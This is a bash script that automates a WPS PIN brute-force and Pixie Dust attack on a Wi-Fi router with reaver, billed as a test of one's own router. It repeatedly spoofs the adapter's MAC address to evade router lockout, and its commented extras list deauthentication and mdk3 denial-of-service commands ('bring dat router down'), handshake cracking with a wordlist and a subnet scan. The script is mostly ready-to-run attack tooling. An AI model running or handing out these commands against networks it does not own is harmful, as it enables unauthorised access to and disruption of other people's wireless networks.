#!/bin/bash 

###################################################################################
# This script is to test your routers security and should be set to run every 10 minutes via crontab - for WPS only - can grab handshakes but good luck!
# JP - 07/08/15 - Script created 
# JP - 07/08/15 - Added hardcoded Variables as suggested by CK
# JP - 10/08/15 - Added loops/more variables - automated log and session files/checks - added instructions and WPS pixie attack
# JP - 30/06/18 - Removed crontab entries / added WLAN automation, cleaned up script
###################################################################################


#######  Instructions  ############

#	FILL OUT ALL HARDCODED VARIABLES BEFORE RUNNING THIS SCRIPT 
#	Make sure BSSID is in correct format - when this script is ran for the first time on a new device it will create a <bssid>.log and <bssid>.wpc file in /usr/local/etc/reaver  - unless these files already exist 
#        -- to see the status of the brute force pin attack -  tail -f /usr/local/etc/$BSSID.log - this file will also show you what the password is once cracked!


# 	Default settings are un-commented - if you want to change the reaver commands un-comment as required - becarefull and make sure you fully understand what changes you are making :)
#       It can sometime take 3 or more days to finally get the WPS pin - be paitent and let it run- if the first 4 digits are low this can be quite quick (example: 0345) - last 4 digits are a checksum (quick ~3 hours)
#       Reducing the delay in pin attempts can cause lockout of the router - you might get lucky but 10 seconds per pin seems to be OK - one router required 20 seconds per pin attempt!
#       If you think the router is WPS locked or does not have WPS -  find out with wash command - wash -i <wlan_device>
#       If you need to start network manager up  - service networking start  -service network-manager start

#       TIP: #	If you want to change MAC every 10 minutes add this to crontab - */10 * * * * root /<path_to_script>/wps_cracker.sh


#########  Assumptions ############

# 	You have some UNIX/LINUX knowledge
#       You are running Kali Linux and have all the aircrack pacakges updated (apt-get update / apt-get upgrade /apt-get dist-upgrade / apt-get install)
#       You have have the correct packet injecting wireless adapter
#       /usr/local/etc/reaver is default location for storing log files and reaver data - Currently default for Kali 2.0 and aircrack suite - create the directory youself if it dosent exist

# To find router information for fill out section:
#WLAN_DEVICE=$(airmon-ng|tr -s '\n' '\\n' | awk '{print $5}')
# airodump-ng $WLAN_DEVICE
# or find strongest router using signal variable:
#aireplay-ng -9 $WLAN_DEVICE

######################################

#### FILL OUT SECTION ######

#Hard coded variables - these need to all be set before running script - this is the info on the AP you want to atttack (Please don't attack neighbours - crack your own router) - generate this info from airodump-ng <wlan_device>!

BSSID=		       #Must be in format AA:BB:CC:DD:EE:FF
ESSID=  		       #Name of wireless target
CHANNEL=               #Wireless channel of target
DELAY=              #Amount of seconds between each pin attempt - 10 seems to be a safe number without causing WPS lockout or rate limiting
WLAN_DEVICE=$(airmon-ng|tr -s '\n' '\\n' | awk '{print $5}')   #Automate WLAN_DEVICE as requested by ck
#WLAN_DEVICE=       #un-comment and fill out if above fails


##############################################

#### CODE SECTION - DO NOT MAKE ANY CHANGES HERE UNLESS YOU TAKE A BACKUP OF THIS FILE AND WANT TO IMPROVE THIS SCRIPT :)  #######


if [[ "$WLAN_DEVICE" == "" ]] || [[ "$BSSID" == "" ]] || [[ "$ESSID" == "" ]] || [[ "$CHANNEL" == "" ]] || [[ "$DELAY" == "" ]] 

then

	echo "Please make sure all hardcoded variables are set - vi this script and read the instructions :)" 
	exit 1

fi

####################################################################################

# Kill running reaver and aireplay processes if running

RPID=0
APID=0

RPID=$(ps -ef |grep -i reaver |grep -vi grep | awk '{print $2}')
APID=$(ps -ef|grep -i aireplay-ng|grep -vi grep | awk '{print $2}')
RPID_CHECK=$(ps -ef | grep -ic reaver)
APID_CHECK=$(ps -ef | grep -ic aireplay)


if [ $RPID_CHECK -eq 2 ] 

then
	kill -1 $RPID
	sleep 5
fi


if [ $APID_CHECK -eq 2 ]

then
        kill -1 $APID
        sleep 5
fi	


####################################################################################

BSSID_FORMAT=$(echo $BSSID | sed 's/\://g')

# Check if log file exists, if not then create 

LOGLOCATION=/usr/local/etc/reaver/$BSSID_FORMAT
LOGEXT=".log"
LOGFILE="$LOGLOCATION$LOGEXT"

if [ ! -f $LOGFILE ] 
then
	echo "'$LOGFILE' Not found...creating"
        touch $LOGFILE
        chmod 755 $LOGFILE
fi

# Check if session exists, if not then start new session and store variable

SESSLOCATION=/usr/local/etc/reaver/$BSSID_FORMAT
SESSEXT=".wpc"
SESSION="$SESSLOCATION$SESSEXT"

if [ ! -f $SESSION ]
then
	echo "'$SESSION' Not Found....creating"
        touch $SESSION
fi

###################################################################################
# Stop start $WLAN_DEVICE device on $CHANNEL and gain new mac address 

if [[ $WLAN_DEVICE == wlan0 ]];
then
        airmon-ng check kill
        sleep 5
        ifconfig $WLAN_DEVICE down
        sleep 5
        macchanger -r $WLAN_DEVICE
        sleep 5
        ifconfig $WLAN_DEVICE up
        sleep 5
        airmon-ng start $WLAN_DEVICE $CHANNEL
        sleep 5

elif [[ $WLAN_DEVICE = "wlan0mon" ]];
then
        ifconfig $WLAN_DEVICE down
        sleep 5
        airmon-ng stop $WLAN_DEVICE
        sleep 5
        airmon-ng check kill
        sleep 5
        WLAN_DEVICE=$(airmon-ng|tr -s '\n' '\\n' | awk '{print $5}')
        ifconfig $WLAN_DEVICE down
        sleep 5
        macchanger -r $WLAN_DEVICE
        sleep 5
        ifconfig $WLAN_DEVICE up
        sleep 5
        airmon-ng start $WLAN_DEVICE $CHANNEL
        sleep 5
else
        echo "Cannot determine WLAN device, exiting"
        exit 1
fi

#Set new WLAN_DEVICE variable	
WLAN_DEVICE=$(airmon-ng |awk '{print $2}' | tail -3)

################################################################################# 
#Reaver commands to crack that password for you ;)
#Learn the reaver flags if you want to know what they do

#PICK ONE ONLY - default is pixie attack below which has a 10% success rate!!!!!

#Option 1:
reaver -i $WLAN_DEVICE -b $BSSID -c $CHANNEL -vvv -K 1 s $SESSION >> $LOGFILE &

#Option 2:  (Most Reliable)
#reaver -i $WLAN_DEVICE -b $BSSID -d $DELAY -c $CHANNEL -vv -s $SESSION >> $LOGFILE &

#Option 3:  (Semi Reliable - seems to work if Option 1 does not)
#reaver -i $WLAN_DEVICE -b $BSSID -a -S -N -d $DELAY -vv -w -s $SESSION -c $CHANNEL >> $LOGFILE &

#Option 4: 
#reaver -i $WLAN_DEVICE -A -b $BSSID -c $CHANNEL -S -N -L -d $DELAY -r 5:3 -vv -s $SESSION  >> $LOGFILE &

#Option 5:
#reaver -i $WLAN_DEVICE -c $CHANNEL -b $BSSID -vv -L -N -d 15 -T .5 -r 3:15 -s $SESSION >> $LOGFILE &
 
#Option 6: 
#reaver -i $WLAN_DEVICE -f -c $CHANNEL -b $BSSID -r 3:10 -E -S -vv -N -T 1 -t 20 -d $DELAY -x 30 -s $SESSION >> $LOGFILE & 


#################################################################################
#Aireplay section - keep alives - not needed unless you get dropped connected or authentication errors - i've used this sometimes :) 

#PICK ONE ONLY if you decide to use this!!!! 

#Option 1: (Most Reliable)
#aireplay-ng $WLAN_DEVICE -1 120 -a $BSSID -e $ESSID -q1 &
#sleep 5 


#Option 2:
#aireplay-ng -1 20 -a $BSSID -e $ESSID -q 10 $WLAN_DEVICE &
#sleep 5

exit 0


#END OF SCRIPT


#################################################################################


#### OTHER STUFF you might like to use :) ####

#find AP close with response time
#aireplay-ng -9 $WLAN_DEVICE

#find a valid mac address
#mdk3 $WLAN_DEVICE f -t $BSSID -f 99:99:99

#send deauth to router
#aireplay-ng -0 10 -a $BSSID $WLAN_DEVICE

#aircrack-ng -w /root/Wordlists/netgear_passwords/adjective_noun.txt <handshake file location>

#Search subnet for valid IPS in 192.168.128.0 to 255 range
#nmap -sP 192.187.128.0-255

# ifconfig wlan0 down
# ifconfig wlan0 hw ether 00:BA:AD:BE:EF:69
#OR 
##ifconfig $WLAN_DEVICE down && macchanger -a $WLAN_DEVICE && ifconfig $WLAN_DEVICE up
# ifconfig wlan0 up
# airmon-ng start wlan0
# reaver -i mon0 -b 00:01:02:03:04:05 -vv --mac=00:BA:AD:BE:EF:69

# MDK it and bring dat router down - not needed unless router is locked - all commented out
#mdk3 $WLAN_DEVICE m -t $BSSID
#mdk3 $WLAN_DEVICE a -a $BSSID -m
#Found this which could help bring down router
#mdk3 $WLAN_DEVICE a -a $BSSID -m
#mdk3 $WLAN_DEVICE b -a $BSSID -n $ESSID -h -c $CHANNEL
#mdk3 $WLAN_DEVICE d -a $BSSID -c $CHANNEL
#mdk3 $WLAN_DEVICE m -t $BSSID

#################################################################################
